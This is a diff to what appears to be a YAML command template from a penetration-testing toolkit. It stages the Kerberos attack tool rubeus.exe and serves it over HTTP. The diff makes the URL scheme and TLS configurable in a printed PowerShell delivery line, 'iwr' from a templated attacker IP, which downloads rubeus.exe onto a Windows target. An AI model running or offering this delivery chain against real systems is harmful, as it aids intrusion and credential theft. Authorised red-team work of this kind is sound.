@@ -9,8 +9,8 @@ content: |
   mkdir -p packstation/outbound; cp -n {{ tools_dir }}/ghostpack/rubeus.exe packstation/outbound/; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      -----PowerShell-----                      '; \
-  printf '%s\n' 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/rubeus.exe -Outfile {{ delivery_path_windows }}\rubeus.exe'; \
+  printf '%s\n' 'Deliver: iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/rubeus.exe -Outfile {{ delivery_path_windows }}\rubeus.exe'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                         -----CMD-----                          '; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }}
